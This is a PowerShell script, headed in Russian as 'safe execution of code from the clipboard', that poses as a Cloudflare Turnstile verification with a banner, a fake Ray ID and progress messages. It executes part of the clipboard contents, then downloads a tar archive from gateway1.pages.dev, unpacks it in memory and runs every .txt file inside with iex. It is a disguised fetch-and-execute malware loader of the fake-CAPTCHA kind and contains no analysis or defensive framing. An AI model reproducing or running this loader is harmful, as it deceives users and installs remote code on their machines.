
# === Безопасное выполнение кода из буфера обмена ===

$clip = Get-Clipboard -Raw
if ($clip.Length -ge 260) {
    iex($clip.Substring(260))
} else {
    Write-Host "[!] Clipboard content is too short. Length: $($clip.Length)"
}

Start-Sleep -Seconds 1

echo "
  ____ _                 _  __ _                
 / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___ 
| |   | |/ _ \| | | |/ _` | |_| |/ _` | '__/ _ \
| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/
 \____|_|\___/ \__,_|\__,_|_| |_|\__,_|_|  \___|
 ";

Write-Host "Ray ID: b068ea8aebd976e9"
Write-Host "Running Turnstile challenge, this won't take long..."

if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
          ForEach-Object { $_.GetTypes() } |
          Where-Object { $_.FullName -eq 'TarExtractor' })) {

    $tarExtractorCode = @"
    using System;
    using System.IO;
    using System.Collections.Generic;

    public class TarExtractor
    {
        public static Dictionary<string, byte[]> ExtractTarFromMemory(byte[] tarData)
        {
            var extractedFiles = new Dictionary<string, byte[]>();

            using (var memoryStream = new MemoryStream(tarData))
            {
                while (memoryStream.Position < memoryStream.Length)
                {
                    byte[] header = new byte[512];
                    memoryStream.Read(header, 0, 512);

                    string fileName = System.Text.Encoding.ASCII.GetString(header, 0, 100).Trim('\0');
                    if (string.IsNullOrEmpty(fileName)) break;

                    string fileSizeOctal = System.Text.Encoding.ASCII.GetString(header, 124, 12).Trim('\0').Trim();
                    long fileSize = Convert.ToInt64(fileSizeOctal, 8);

                    byte[] fileData = new byte[fileSize];
                    memoryStream.Read(fileData, 0, fileData.Length);

                    extractedFiles.Add(fileName, fileData);

                    long padding = 512 - (memoryStream.Position % 512);
                    if (padding < 512)
                    {
                        memoryStream.Seek(padding, SeekOrigin.Current);
                    }
                }
            }

            return extractedFiles;
        }
    }
"@

    Add-Type -TypeDefinition $tarExtractorCode -Language CSharp
}

$tarUrl = "https://gateway1.pages.dev/ps1.tar"
$webClient = New-Object System.Net.WebClient
$tarData = $webClient.DownloadData($tarUrl)
$extractedFiles = [TarExtractor]::ExtractTarFromMemory($tarData)

foreach ($file in $extractedFiles.Keys) {
    if ($file -match "\.txt$") {
        Write-Host "Challenge completed. Just a moment..."
        $data = $extractedFiles[$file]
        $plugin = [System.Text.Encoding]::UTF8.GetString($data)
        iex $plugin
    }
}

Write-Host "Done"
